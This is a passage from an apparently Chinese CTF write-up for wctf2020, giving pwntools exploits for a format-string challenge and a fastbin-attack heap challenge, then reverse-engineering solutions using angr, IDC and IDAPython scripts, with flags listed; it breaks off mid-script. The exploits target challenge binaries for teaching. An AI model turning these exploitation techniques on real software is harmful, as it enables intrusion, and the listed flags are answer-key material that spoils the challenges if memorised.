class="line">pwndbg&gt; telescope 0x7f8f4b0c4891+0x36e6bf</span><br><span class="line">00:0000│   0x7f8f4b432f50 —▸ 0x558030d75020 —▸ 0x7f8f4b434620 (_IO_2_1_stdout_) ◂— 0xfbad2887</span><br><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">    0x558030b73000     0x558030b75000 r-xp     2000 0      &#x2F;mnt&#x2F;hgfs&#x2F;shared&#x2F;challenge&#x2F;dididada&#x2F;dididada</span><br><span class="line">    0x558030d74000     0x558030d75000 r--p     1000 1000   &#x2F;mnt&#x2F;hgfs&#x2F;shared&#x2F;challenge&#x2F;dididada&#x2F;dididada</span><br><span class="line">    0x558030d75000     0x558030d76000 rw-p     1000 2000   &#x2F;mnt&#x2F;hgfs&#x2F;shared&#x2F;challenge&#x2F;dididada&#x2F;dididada</span><br></pre></td></tr></table></figure><p>根据调试可以看到，本来<code>printf</code>是取<code>stdout</code>的，输出流嘛，但是如果我们把<code>.bss</code>出的<code>stdout</code>指针改为指向<code>stderr</code>，那<code>close(1)</code>，是不是就没问啥问题了，反正<code>stderr</code>的<code>fileno</code>是2，而且<code>stdout</code>和<code>stderr</code>地址很接近：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p stdout</span><br><span class="line">$1 &#x3D; (struct _IO_FILE *) 0x7f8f4b434620 &lt;_IO_2_1_stdout_&gt;</span><br><span class="line">pwndbg&gt; p stderr</span><br><span class="line">$2 &#x3D; (struct _IO_FILE *) 0x7f8f4b434540 &lt;_IO_2_1_stderr_&gt;</span><br></pre></td></tr></table></figure><p>综上，得到思路为：</p><ul><li>ask_time泄露程序基地址</li><li>leak泄露<code>stderr</code>的第二个字节，（为了消除那1/16的概率</li><li>fmt_attack，把secret第一个字节改为<code>\x00</code>，在把bss段里的<code>stdout</code>改为指向<code>stderr</code></li></ul><p>最终exp为：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># usage: python exp.py REMOTE=x.x.x.x</span></span><br><span class="line">from pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch='amd64'</span><br><span class="line"></span><br><span class="line"><span class="function">def <span class="title">debug</span><span class="params">(addr,PIE=True)</span>:</span></span><br><span class="line"><span class="function"><span class="keyword">if</span> PIE:</span></span><br><span class="line"><span class="function">text_base </span>= <span class="keyword">int</span>(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'"</span>.format(p.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr)))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">gdb.<span class="built_in">attach</span>(p,<span class="string">"b *&#123;&#125;"</span>.format(hex(addr)))</span><br><span class="line"></span><br><span class="line">def cmd(command):</span><br><span class="line">p.recvuntil(<span class="string">"&gt;&gt;"</span>)</span><br><span class="line">p.sendline(str(command))</span><br><span class="line"></span><br><span class="line">def main(host,port=<span class="number">16253</span>):</span><br><span class="line">global p</span><br><span class="line"><span class="keyword">if</span> host:</span><br><span class="line">p = remote(host,port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = <span class="built_in">process</span>(<span class="string">"./dididada"</span>)</span><br><span class="line"># gdb.<span class="built_in">attach</span>(p)</span><br><span class="line">debug(<span class="number">0x000000000000ECC</span>)</span><br><span class="line">p.recvuntil(<span class="string">"me the time:"</span>)</span><br><span class="line">p.send(<span class="string">"+\n+\n+\n"</span>)</span><br><span class="line">p.recvuntil(<span class="string">":"</span>)</span><br><span class="line">elf_base = <span class="keyword">int</span>(p.recvuntil(<span class="string">":"</span>)[:<span class="number">-1</span>]) - <span class="number">0xbd5</span></span><br><span class="line">info(<span class="string">"elf : "</span> + hex(elf_base))</span><br><span class="line">#leak <span class="built_in">stdout</span></span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line">p.send(p64(elf_base+<span class="number">0x000000000202041</span>))</span><br><span class="line"><span class="built_in">stderr</span> = (ord(p.recv(<span class="number">1</span>))&lt;&lt;<span class="number">8</span>)|<span class="number">0x40</span></span><br><span class="line">#fmt attack</span><br><span class="line">cmd(<span class="number">2</span>)</span><br><span class="line">payload = <span class="string">"%11$hn%&#123;&#125;c%12$hn"</span>.format(<span class="built_in">stderr</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x18</span>,<span class="string">"+"</span>)+p64(elf_base+<span class="number">0x000000000202060</span>)</span><br><span class="line">payload += p64(elf_base+<span class="number">0x202020</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">cmd(<span class="number">3</span>)</span><br><span class="line">p.send(<span class="string">"\x00"</span>*<span class="number">0x40</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">main(args['REMOTE'])</span><br></pre></td></tr></table></figure><h2 id="easyfast-2-solves"><a href="#easyfast-2-solves" class="headerlink" title="easyfast - 2 solves"></a>easyfast - 2 solves</h2><blockquote><p>Author: ColdShield</p></blockquote><p>flag:<code>wctf2020{THE_MOST_EASY_FASTBINATTACK}</code></p><p>预期是最简单的fastbin attack（但是出题是在比赛前夕补上的一道，粗心没给下标做检查导致和前面的题变成一个性质了…）</p><p>程序只能malloc三次，而且三次都只能是fast chunk，free的时候没有检查指针也没有对指针清零，Modify也是直接read 8个字节，没有多余检查</p><p>程序getshell只需要满足data段的变量为0即可，然后在data段上有一个0x50的fakesize</p><p><img src="https://s1.ax1x.com/2020/03/30/GnjA6U.png" alt="GnjA6U.png"></p><p>所以思路就是 </p><p><code>malloc(0x48)-&gt;free(array[0])-&gt;modify(array[0],p64(&amp;fakesize-8))</code></p><p><code>-&gt;malloc(0x48)-&gt;malloc(0x48)-&gt;modify(array[0],p64(0))</code></p><p><strong>exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">binary = <span class="string">'./easyheap'</span><span class="comment">#binary's name here</span></span><br><span class="line">context.binary = binary<span class="comment">#context here</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">pty = process.PTY</span><br><span class="line">p = process(binary, aslr = <span class="number">1</span>, stdin=pty, stdout=pty)<span class="comment">#process option here</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">Host ='101.200.53.102'</span></span><br><span class="line"><span class="string">Port =22222</span></span><br><span class="line"><span class="string">p = remote(Host,Port)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">elf = ELF(binary)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">my_u64 = <span class="keyword">lambda</span> x: u64(x.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">my_u32 = <span class="keyword">lambda</span> x: u32(x.ljust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line">global_max_fast=<span class="number">0x3c67f8</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">loginfo</span><span class="params">(what=<span class="string">''</span>,address=<span class="number">0</span>)</span>:</span></span><br><span class="line">log.info(<span class="string">"\033[1;36m"</span> + what + <span class="string">'-----&gt;'</span> + hex(address) + <span class="string">"\033[0m"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># todo here</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Alloc</span><span class="params">(size)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"choice&gt;\n"</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"size&gt;\n"</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Free</span><span class="params">(index)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"choice&gt;\n"</span>)</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"index&gt;\n"</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Modify</span><span class="params">(index,content)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"choice&gt;\n"</span>)</span><br><span class="line">p.sendline(<span class="string">"3"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"index&gt;\n"</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line">p.send(content)</span><br><span class="line"></span><br><span class="line">Alloc(<span class="number">0x48</span>)</span><br><span class="line">Free(<span class="number">0</span>)</span><br><span class="line">Modify(<span class="number">0</span>,p64(<span class="number">0x602080</span>))</span><br><span class="line">Alloc(<span class="number">0X48</span>)</span><br><span class="line">Alloc(<span class="number">0X48</span>)</span><br><span class="line">Modify(<span class="number">2</span>,<span class="string">'\x00'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="Cr0ssFun-42-solves"><a href="#Cr0ssFun-42-solves" class="headerlink" title="Cr0ssFun - 42 solves"></a>Cr0ssFun - 42 solves</h2><blockquote><p>Author: 52HeRtz</p></blockquote><p>出这题的前几天，刚好去俄罗斯一个比赛瞧了一眼，发现有个这样的题，差点没把我气死，于是我就差不多的再出了一个类似的题hhhhh。。。</p><p>丢进 IDA，可以看见一堆函数</p><p><img src="https://s1.ax1x.com/2020/03/30/GnXfyD.png" alt="GnXfyD.png"></p><p>可以看见一个check函数，拼命的调用其它函数</p><p><img src="https://s1.ax1x.com/2020/03/30/GnXWQO.png" alt="GnXWQO.png"></p><p><img src="https://s1.ax1x.com/2020/03/30/GnXhOe.png" alt="GnXhOe.png"></p><p>接下来就是不断地套娃，其实就把所有的字符都弄出来就可以了，手动或者写脚本都可以。</p><p>当然出题人作为一个很懒的web狗，当然是喜欢用工具，可以用 angr 求解。</p><p>看起来输入正确的 flag 后会打印 <code>Your flag is correct, go and submit it!</code></p><p>用 angr 求解什么样的输入可以使得程序输出 <code>Your flag is correct, go and submit it!</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line">proj = angr.Project(<span class="string">"Cr0ssfun"</span>)</span><br><span class="line">simgr = proj.factory.simgr()</span><br><span class="line">simgr.explore(find=<span class="keyword">lambda</span> s: <span class="string">b"Your flag is correct, go and submit it!"</span> <span class="keyword">in</span> s.posix.dumps(<span class="number">1</span>))</span><br><span class="line">print(simgr.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>))</span><br></pre></td></tr></table></figure><p>等几秒就出来了</p><p><img src="https://s1.ax1x.com/2020/03/30/GnX5eH.jpg" alt="GnX5eH.jpg"></p><h2 id="level1-30-solves"><a href="#level1-30-solves" class="headerlink" title="level1 - 30 solves"></a>level1 - 30 solves</h2><blockquote><p>Author: ColdShield</p></blockquote><p>flag:<code>wctf2020{d9-dE6-20c}</code></p><p><img src="https://s1.ax1x.com/2020/03/30/GnR5ZD.png" alt="GnR5ZD.png"></p><p>程序流程的意思就是：</p><ol><li>从flag这个文件中读出了长度为0x14的字符串到ptr指向的地方去</li><li>从1开始到0x13，循环，i为奇数时输出<code>ptr[i]&lt;&lt;i</code>，i为偶数时输出<code>i*ptr[i]</code>，格式都是<code>%ld</code></li></ol><p>然后程序给出了一个<code>output.txt</code></p><p>根据output逆推出flag即可，这里给一个写的很简陋的py程序供参考</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> open(<span class="string">"output.txt"</span>,<span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    i=<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> i%<span class="number">2</span>==<span class="number">0</span>:</span><br><span class="line">            num=int(f.readline().strip(<span class="string">'\n'</span>))</span><br><span class="line">            print(chr(int(num/i)),end=<span class="string">""</span>),</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            num=int(f.readline().strip(<span class="string">'\n'</span>))</span><br><span class="line">            print(chr(num&gt;&gt;i),end=<span class="string">""</span>),</span><br><span class="line">        i+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> i==<span class="number">0x14</span> :</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>当然因为程序没有输出<code>ptr[0]</code>的内容，所以根据<code>wctf2020{}</code>的格式补上<code>w</code>就可以了</p><h2 id="level2-24-solves"><a href="#level2-24-solves" class="headerlink" title="level2 - 24 solves"></a>level2 - 24 solves</h2><blockquote><p>Author: ColdShield</p></blockquote><p>flag:<code>wctf2020{Just_upx_-d}</code></p><p>程序运行弹<code>where is it?</code></p><p>然后丢进IDA发现啥都没有，这种啥都没有的程序就是很明显加壳的程序</p><p><img src="https://s1.ax1x.com/2020/03/30/Gn02Bn.png" alt="Gn02Bn.png"></p><p>用Detect It Easy查壳，UPX 3.95压缩壳</p><p><img src="https://s1.ax1x.com/2020/03/30/Gn06Xj.png" alt="Gn06Xj.png"></p><p>然后直接用upx对应版本的工具脱壳就好了：<a href="https://github.com/upx/upx/tags" target="_blank" rel="noopener">https://github.com/upx/upx/tags</a></p><p>再丢进IDA就能看到flag</p><p><img src="https://s1.ax1x.com/2020/03/30/Gn0fA0.png" alt="Gn0fA0.png"></p><h2 id="level3-26-solves"><a href="#level3-26-solves" class="headerlink" title="level3 - 26 solves"></a>level3 - 26 solves</h2><blockquote><p>Author: ColdShield</p></blockquote><p>flag:<code>wctf2020{Base64_is_the_start_of_reverse}</code></p><p><img src="https://s1.ax1x.com/2020/03/30/Gn0hNV.png" alt="Gn0hNV.png"></p><p>稍微看一下，main程序的意思就是输入一串字符串，随机去执行两个分支，一个分支是用<code>base64_encode</code>编码之后输出编码后的内容，另外一个分支就是那些字符串，很明显就是要解这一串<code>d2G0ZjLwHjS7DmOzZAY0X2lzX3CoZV9zdNOydO9vZl9yZXZlcnGlfD==</code>的码</p><p>但是直接解就会是这样：</p><p><img src="https://s1.ax1x.com/2020/03/30/Gn0ycQ.png" alt="Gn0ycQ.png"></p><p>就是程序说的<code>different from the standard</code></p><p>一般CTF碰到这种情况，要么是<code>base64_encode</code>中的编码算法出了问题，要么是base64的编码table出了问题。显然分析前者会比较麻烦，所以先看看table</p><p><img src="https://s1.ax1x.com/2020/03/30/Gn0o3F.png" alt="Gn0o3F.png"></p><p>IDA里面看上去table是正常的，但是注意一下右边的引用数是没有显示完的，后面还有<code>...</code></p><p>这个时候可以开IDA的<code>Options-&gt;general</code>找到<code>Cross-references</code>下的<code>Disassembly(non-graph)</code>，把这个数值改大一点</p><p><img src="https://s1.ax1x.com/2020/03/30/Gn07jJ.png" alt="Gn07jJ.png"></p><p>可以看到我们的<code>base64_table</code>还在另外一个<code>O_OLookAtYou</code>的函数里面被引用了</p><p>ps：Emmmmm…怎么说呢，出这个题的意思就是想让你们学会看数据引用&amp;发现一些程序中看起来奇怪的函数名，比如这个题目的话，如果一上来就看到了这个<code>O_OLookAtYou</code>就肯定会点进去看一看，就会知道base64_table被改过了，也就知道base64编码出问题多半是因为table而不是算法出问题(节省分析的时间)，虽然说从main的函数调用里面是看不到这个函数的(如下图<code>Xfers graph from</code>)</p><p><img src="https://s1.ax1x.com/2020/03/30/GnWRYj.png" alt="GnWRYj.png"></p><p>因为这个函数的函数指针被放在了ELF中main函数执行之前的初始化段<code>_init_array</code>，在执行main函数之前这个函数就被调用了（linux下用gcc编译之前在函数声明前面加上<code>__attribute__((constructor))</code>）</p><p><img src="https://s1.ax1x.com/2020/03/30/GnWIXV.png" alt="GnWIXV.png"></p><p>这个函数就是把<code>base64_table</code>中前面下标0-9处的十个字符，和后面的下标19~10处的十个字符互相调换了一下</p><p>下面就是根据新的<code>base64_table</code>解刚开始的那串码了，这里不再赘述</p><h2 id="level4-12-solves"><a href="#level4-12-solves" class="headerlink" title="level4 - 12 solves"></a>level4 - 12 solves</h2><blockquote><p>Author: ColdShield</p></blockquote><p>flag:<code>wctf2020{This_IS_A_7reE}</code></p><p><img src="https://s1.ax1x.com/2020/03/30/GnWTmT.png" alt="GnWTmT.png"></p><p>直接运行的话程序是输出这个，学过数据结构的应该能很明显地看到这是在遍历什么东西，(<code>*left</code>，<code>*right</code>：二叉树)</p><p>然后给了两种遍历方式出来的字符串，第三种是显示<code>No way</code>，所以flag肯定就是第三种遍历方式遍历出来的了，再来分析</p><p><strong>init</strong></p><p><img src="https://s1.ax1x.com/2020/03/30/GnWqk4.png" alt="GnWqk4.png"></p><p>首先看到<code>init</code>函数里面做的是一堆初始化的流程，这样直接从IDA看的话应该看不出什么来，想分析这里的话需要我们自己一步步的来简化这些乱七八糟的东西（俗称就是人能看XD）不过这个题不简化这里一样可以写，所以这个简化方式留到开学之后看能不能再跟你们线下讲吧….截图什么的太麻烦了，这里放几张效果图</p><p><img src="https://s1.ax1x.com/2020/03/30/GnWH7F.png" alt="GnWH7F.png"></p><p><img src="https://s1.ax1x.com/2020/03/30/GnWKY9.png" alt="GnWKY9.png"></p><p><img src="https://s1.ax1x.com/2020/03/30/GnWmo4.png" alt="GnWmo4.png"></p><p><strong>type1</strong></p><p><img src="https://s1.ax1x.com/2020/03/30/GnWuFJ.png" alt="GnWuFJ.png"></p><p>可以看到这是一个递归函数，如果写过数据结构树遍历的话肯定特别熟悉，这个是中根遍历的递归算法</p><p><strong>type2</strong></p><p>同样如果对数据结构树遍历熟悉的话可以看出来这个是后根遍历的递归算法</p><p><img src="https://s1.ax1x.com/2020/03/30/GnWMWR.png" alt="GnWMWR.png"></p><p>所以flag就肯定是先根遍历得到的字符串了，可以去网上学一下树的三种遍历中如何根据其中两种遍历得到另外一种，好像还是一个面试题来着？不过我感觉能get到的话就很好理解，这里复原的时候唯一一个可能会卡壳的就是在复原根节点右子树的时候有两个<code>_</code>，要稍微注意一下规律</p><p>ps：一般来说的话如果涉及到数据结构的逆向题，肯定不会像我这样把两种遍历都给出来的….可能就直接一个裸的程序给你让你去找flag，所以这个时候就要学会写脚本or调试硬刚，这个题主要还是希望能让你们熟悉树或其他数据结构应该怎么来分析&amp;这些数据结构在底层是怎么存储的</p><p>如果树太大的情况下还可以直接去硬刚汇编，因为这两个递归函数指令数量都是一样的，只是顺序不同而已，用下面这个IDC脚本把type2的指令顺序交换一下（把putchar放到前面去）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> address1=<span class="number">0x4007CA</span>;</span><br><span class="line">    <span class="keyword">auto</span> address2=<span class="number">0x4007EA</span>;</span><br><span class="line">    <span class="keyword">auto</span> address3=<span class="number">0x4007FB</span>;</span><br><span class="line">    <span class="keyword">auto</span> code1=<span class="string">""</span>;</span><br><span class="line">    <span class="keyword">auto</span> i=<span class="number">0</span>,j=<span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(i=address1;i&lt;address2;i++)</span><br><span class="line">    &#123;</span><br><span class="line">    code1=code1+Byte(i);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    j=address1;</span><br><span class="line">    <span class="keyword">for</span>(i=address2;i&lt;address3;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        PatchByte(j++,Byte(i));</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="built_in">strlen</span>(code1);i++)</span><br><span class="line">    &#123;</span><br><span class="line">        PatchByte(j++,ord(code1[i]));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再把call指令的偏移用keypatch改改就好了，强行改成先根遍历，效果图<br><img src="https://s1.ax1x.com/2020/03/30/GuC2sP.png" alt="GuC2sP.png"></p><p>执行就有flag</p><p><img src="https://s1.ax1x.com/2020/03/30/GuCgMt.png" alt="GuCgMt.png"></p><h2 id="funnyre-7-solves"><a href="#funnyre-7-solves" class="headerlink" title="funnyre - 7 solves"></a>funnyre - 7 solves</h2><blockquote><p>Author: Tsiao</p><p>当我跟启奡聊到出题的时候，他很热情地在百忙中抽空给我出了一道题，我觉得如果世上还有雷锋，我觉得一定会是 Tsiao。</p></blockquote><p>考察：</p><p>1、 简单花指令的去除</p><p>2、 在有限域上运算的简化</p><p>首先去除花指令：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ads = <span class="number">0x4005B0</span></span><br><span class="line"></span><br><span class="line">end = <span class="number">0x401DC0</span></span><br><span class="line"></span><br><span class="line">codes = get_bytes(ads, end-ads)</span><br><span class="line"></span><br><span class="line">codes = codes.replace(<span class="string">"\x74\x03\x75\x01\xe8\x90"</span>, <span class="string">"\x90\x90\x90\x90\x90\x90"</span>)</span><br><span class="line"></span><br><span class="line">patch_bytes(ads, codes)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"[+] patch ok"</span></span><br></pre></td></tr></table></figure><p> 随后可以看到逻辑，进行了数次xor操作，又进行了数次移位操作，这里可以使用IDAPython获取每一个操作的详细数据，然后化简，也可以使用angr进行暴力求解。</p><p>解法一：暴力求解：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">dt = [<span class="number">0xd9</span>, <span class="number">0x2c</span>, <span class="number">0x27</span>, <span class="number">0xd6</span>, <span class="number">0xd8</span>, <span class="number">0x2a</span>, <span class="number">0xda</span>, <span class="number">0x2d</span>, <span class="number">0xd7</span>, <span class="number">0x2c</span>, <span class="number">0xdc</span>, <span class="number">0xe1</span>, <span class="number">0xdb</span>, <span class="number">0x2c</span>, <span class="number">0xd9</span>, <span class="number">0xdd</span>, <span class="number">0x27</span>, <span class="number">0x2d</span>, <span class="number">0x2a</span>, <span class="number">0xdc</span>, <span class="number">0xdb</span>, <span class="number">0x2c</span>, <span class="number">0xe1</span>, <span class="number">0x29</span>, <span class="number">0xda</span>, <span class="number">0xda</span>, <span class="number">0x2c</span>, <span class="number">0xda</span>, <span class="number">0x2a</span>, <span class="number">0xd9</span>, <span class="number">0x29</span>, <span class="number">0x2a</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">kaisa</span><span class="params">(xx, kk)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> [(x+kk) &amp; <span class="number">0xFF</span> <span class="keyword">for</span> x <span class="keyword">in</span> xx]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">(xx, kk)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> [x ^ kk <span class="keyword">for</span> x <span class="keyword">in</span> xx]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(xx)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> xx:</span><br><span class="line">        <span class="keyword">if</span> x &lt; ord(<span class="string">'0'</span>) <span class="keyword">or</span> (x &gt; ord(<span class="string">'9'</span>) <span class="keyword">and</span> x &lt; ord(<span class="string">'a'</span>)) <span class="keyword">or</span> x &gt; ord(<span class="string">'f'</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">for</span> k1 <span class="keyword">in</span> range(<span class="number">0x100</span>):</span><br><span class="line">        tt = kaisa(dt, k1)</span><br><span class="line">        <span class="keyword">for</span> k2 <span class="keyword">in</span> range(<span class="number">0x100</span>):</span><br><span class="line">            tt2 = xor(tt, k2)</span><br><span class="line">            <span class="keyword">if</span> check(tt2):</span><br><span class="line">                print(bytes(tt2))</span><br><span class="line">                print(k1, k2)</span><br></pre></td></tr></table></figure><p>解法二：IDAPython根据指令去逆向：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">def trans(xx, kk):</span><br><span class="line">    return [(x-kk) &amp; 0xFF for x in xx]</span><br><span class="line">def xor(xx, kk):</span><br><span class="line">    return [x^kk for x in xx]</span><br><span class="line">def not_(xx):</span><br><span class="line">    return [~x for x in xx]</span><br><span class="line"></span><br><span class="line">dt &#x3D; [0xd9, 0x2c, 0x27, 0xd6, 